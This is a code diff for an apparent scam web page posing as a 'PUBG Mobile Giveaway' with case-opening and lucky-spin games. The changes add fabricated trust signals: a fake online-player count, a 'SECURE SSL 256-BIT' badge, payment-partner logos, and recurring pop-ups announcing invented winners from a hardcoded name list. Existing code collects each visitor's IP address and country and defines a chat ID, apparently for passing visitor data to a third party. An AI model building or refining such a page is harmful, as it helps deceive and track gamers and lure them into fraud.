@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>PUBG Mobile - Giveaway</title>
     
+    <!-- Фавикон -->
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    
     <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
@@ -29,6 +32,7 @@
             overflow-x: hidden;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            scroll-behavior: smooth; /* Плавный скролл */
         }
 
         /* --- СТИЛИ ПРЕЛОАДЕРА --- */
@@ -61,7 +65,7 @@
             width: 40px;
             height: 40px;
             border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid #ffffff; /* Цвет змейки */
+            border-top: 4px solid #ffffff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -94,34 +98,14 @@
         }
 
         header {
+            background: rgba(0, 0, 0, 0.95);
             padding: 12px 16px;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
+            flex-direction: column;
+            gap: 1px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             position: sticky; top: 0; z-index: 100;
         }
-
-        /* Брендовый блок теперь в центре */
-        .brand-center {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-        }
-
-        .pubg-brand {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            cursor: pointer;
-        }
-        .pubg-app-icon svg { display: block; width: 44px; height: 44px; }
-        .pubg-title { font-family: 'Teko', sans-serif; font-weight: 700; font-size: 18px; letter-spacing: 0.5px; }
-        .brand-badges { display: flex; align-items: center; gap: 8px; margin-top: 2px; }
-
-        .badge { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 9999px; font-weight: 700; font-size: 12px; line-height: 1; }
-        .badge-official { background: #ffffff; color: #0b0c0d; border: 1px solid rgba(0,0,0,0.1); }
-        .badge-subscribed { background: rgba(255,255,255,0.25); color: #ffffff; border: 1px solid rgba(255,255,255,0.25); }
-        .badge svg { width: 16px; height: 16px; display: block; }
 
         .balance-display {
             background: rgba(255, 255, 255, 0.05);
@@ -143,7 +127,7 @@
 
         .case-container {
             position: relative;
-            width: 100%;            height: 180px;
+            width: 100%; height: 180px;
             overflow: hidden;
             margin: 20px 0;
         }
@@ -172,11 +156,21 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.2s ease-in-out;
         }
+
+        .case-item.common { background: rgba(100, 100, 100, 0.5); }
+        .case-item.rare { background: rgba(0, 110, 255, 0.5); }
+        .case-item.epic { background: rgba(170, 0, 255, 0.5); }
+        .case-item.legendary { background: rgba(255, 170, 0, 0.5); }
+
         .case-item img { width: 100px; height: 100px; object-fit: contain; opacity: 1 !important; }
 
         .btn-blue {
-            background: var(--pubg-blue);
+            background: linear-gradient(180deg, #0084ff 0%, #0056a7 100%);
             color: white;
             width: calc(100% - 32px);
             margin: 0 16px;
@@ -188,6 +182,14 @@
             display: block;
             cursor: pointer;
             transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 132, 255, 0.4);
+            animation: pulse-blue 2s infinite;
+        }
+
+        @keyframes pulse-blue {
+            0% { box-shadow: 0 0 0 0 rgba(0, 132, 255, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 132, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 132, 255, 0); }
         }
 
         .nav-bar {
@@ -218,75 +220,58 @@
         </div>
     </div>
 
-    <header>
-        <!-- Кнопка "Назад" слева -->
-        <div class="flex items-center gap-2 cursor-pointer" id="backBtn" style="visibility: hidden;" onclick="showSection('hub')">
-            <i class="fas fa-chevron-left text-gray-400"></i>
-            <span class="text-sm font-bold">Назад</span>
+    <div id="live-winner" class="fixed top-20 left-4 z-[1000] bg-black/80 border-l-4 border-yellow-500 p-3 rounded-r-lg shadow-2xl transform -translate-x-[150%] transition-transform duration-500 flex items-center gap-3">
+        <img id="winner-img" src="" class="w-10 h-10 rounded border border-gray-600">
+        <div>
+            <div id="winner-name" class="text-xs font-bold text-yellow-400">Player123</div>
+            <div id="winner-item" class="text-[10px] text-white">получил M416 Glacier</div>
         </div>
+    </div>
 
-        <!-- Брендовый блок (иконка + текст + бейджи) в центре -->
-        <div class="brand-center">
-            <div class="pubg-brand cursor-pointer" onclick="showSection('hub')" aria-label="PUBG Mobile Brand">
-                <div class="pubg-app-icon" aria-hidden="true">
-                    <!-- Квадратная иконка PUBG (без внешнего изображения) -->
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44">
-                        <defs>
-                            <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
-                                <stop offset="0%" stop-color="#1f2a37"/>
-                                <stop offset="100%" stop-color="#0b0c0d"/>
-                            </linearGradient>
-                        </defs>
-                        <rect x="1" y="1" width="42" height="42" rx="10" fill="url(#g)" stroke="rgba(255,255,255,0.15)"/>
-                        <!-- Рамка PUBG -->
-                        <rect x="9" y="13" width="26" height="14" rx="2" fill="none" stroke="#FFFFFF" stroke-width="3"/>
-                        <rect x="6" y="16" width="3" height="8" fill="#FFFFFF"/>
-                        <rect x="35" y="16" width="3" height="8" fill="#FFFFFF"/>
-                        <text x="22" y="23.5" text-anchor="middle" font-family="Teko, Inter, sans-serif" font-size="11" font-weight="700" fill="#FFFFFF">PUBG</text>
-                        <text x="22" y="33" text-anchor="middle" font-family="Inter, sans-serif" font-size="8" font-weight="900" fill="#FFFFFF">MOBILE</text>
-                    </svg>
-                </div>
-                <div>
-                    <div class="pubg-title">PUBG MOBILE</div>
-                    <div class="brand-badges">
-                        <!-- Бейдж Official -->
-                        <span class="badge badge-official" aria-label="Official">
-                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
-                                <path d="M12 2l8 4v6c0 5.25-3.44 9.74-8 11-4.56-1.26-8-5.75-8-11V6l8-4z" fill="#0b0c0d"/>
-                                <path d="M9.5 12.5l2.2 2.2 4.2-4.2" stroke="#ffffff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-                            </svg>
-                            Official
-                        </span>
-                        <!-- Бейдж Subscribed -->
-                        <span class="badge badge-subscribed" aria-label="Subscribed">
-                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
-                                <circle cx="12" cy="12" r="10" fill="rgba(255,255,255,0.35)"/>
-                                <path d="M8 12l3 3 5-5" stroke="#ffffff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-                            </svg>
-                            Subscribed
-                        </span>
-                    </div>
-                </div>
+    <header class="flex flex-col gap-1 border-b border-white/10">
+        <div class="flex justify-between items-center px-4 py-2">
+            <div class="flex items-center gap-2">
+                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                <span class="text-[10px] text-gray-400 uppercase tracking-tighter">Server Online: <span class="text-white">2,841 players</span></span>
+            </div>
+            <div class="flex items-center gap-1 text-[10px] text-green-400">
+                <i class="fas fa-shield-alt"></i>
+                <span>SECURE SSL 256-BIT</span>
             </div>
         </div>
-
-        <!-- Баланс UC справа -->
-        <div class="balance-display">
-            <span class="uc-icon">UC</span>
-            <span id="headerBalance" class="text-sm font-bold">60</span>
-            <div class="btn-plus">+</div>
+        <div class="flex justify-between items-center px-4 pb-3">
+            <div class="flex items-center gap-2 cursor-pointer" id="backBtn" style="visibility: hidden;" onclick="showSection('hub')">
+                <i class="fas fa-chevron-left text-gray-400"></i>
+                <span class="text-sm font-bold">BACK</span>
+            </div>
+            <div class="balance-display">
+                <span class="uc-icon">UC</span>
+                <span id="headerBalance" class="text-sm font-bold tracking-wider">60</span>
+                <div class="btn-plus ml-1"><i class="fas fa-plus text-[8px]"></i></div>
+            </div>
         </div>
     </header>
 
     <main id="section-hub" class="p-4">
         <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
-                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl" alt="Gift Drop">
+                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
                 <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
             </div>
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
-                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl" alt="Lucky Spin">
+                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
                 <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
+            </div>
+        </div>
+        
+        <div class="mt-12 px-6 opacity-50 grayscale contrast-125">
+            <p class="text-center text-[10px] uppercase tracking-widest mb-4">Official Partners & Secure Payments</p>
+            <div class="flex flex-wrap justify-center gap-6 items-center">
+                <i class="fab fa-cc-visa text-3xl"></i>
+                <i class="fab fa-cc-mastercard text-3xl"></i>
+                <i class="fab fa-apple-pay text-4xl"></i>
+                <i class="fab fa-google-pay text-4xl"></i>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Visa_2021.svg/320px-Visa_2021.svg.png" class="h-4">
             </div>
         </div>
     </main>
@@ -309,14 +294,14 @@
         </div>
         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
             <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 1"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 2"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 3"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 4"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 5"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 6"></div><div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 7"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 8"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain" style="opacity: 1;" alt="Prize 9"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain" style="opacity: 1;"></div><div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain" style="opacity: 1;"></div>
             </div>
         </div>
         <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
@@ -352,6 +337,13 @@
         const CHAT_ID = '1709490182';
         const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
         
+        const items = [
+            {name: 'UC 660', img: 'https://p7.itc.cn/q_70/images03/20210525/7d8eaf38362f48c5a95b07c8278aa154.png'},
+            {name: 'M416 Glacier', img: 'https://files.booyah.uz/upload/202205/08/booyah_1493268907247960060_1652018391704.jpg'},
+            {name: 'UC 1800', img: 'https://p7.itc.cn/q_70/images03/20210525/7d8eaf38362f48c5a95b07c8278aa154.png'}
+        ];
+        const names = ['Alex**', 'Kira_88', 'Legenda_PUBG', 'Mavrodi', 'Zxc_Boy', 'Killer_RU'];
+        
         let balance = 60; 
         let isSpinning = false;
         let userIP = '';
@@ -359,6 +351,19 @@
         let currentWinCellId = null;
 
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
+
+        function showWinner() {
+            const winner = document.getElementById('live-winner');
+            const item = items[Math.floor(Math.random() * items.length)];
+            document.getElementById('winner-name').innerText = names[Math.floor(Math.random() * names.length)];
+            document.getElementById('winner-item').innerText = 'выбил ' + item.name;
+            document.getElementById('winner-img').src = item.img;
+
+            winner.classList.remove('-translate-x-[150%]');
+            setTimeout(() => {
+                winner.classList.add('-translate-x-[150%]');
+            }, 4000);
+        }
 
         function updateBalanceUI() {
             document.getElementById('headerBalance').innerText = balance;
@@ -400,7 +405,12 @@
                 let idx;
                 do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
                 lastIdx = idx;
-                tape.innerHTML += `<div class=\"case-item\"><img src=\"${prizeImages[idx]}\" style=\"opacity: 1;\" alt=\"Prize\"></div>`;
+                
+                // Случайный класс редкости
+                const rarityClasses = ['common', 'rare', 'epic', 'legendary'];
+                const rarity = rarityClasses[Math.floor(Math.random() * rarityClasses.length)];
+                
+                tape.innerHTML += `<div class="case-item ${rarity}"><img src="${prizeImages[idx]}" style="opacity: 1;"></div>`;
             }
             tape.style.transform = `translateX(0px)`;
         }
@@ -496,13 +506,16 @@
             initCase();
             updateBalanceUI();
             
+            // Запуск уведомлений о победителях
+            setInterval(showWinner, 8000);
+            
             // Ждем 2 секунды и скрываем прелоадер
             setTimeout(() => {
                 const loader = document.getElementById('preloader');
                 loader.style.opacity = '0';
                 setTimeout(() => {
                     loader.style.display = 'none';
-                }, 500); // время на плавное исчезновение
+                }, 500);
             }, 2000);
         };
     </script>
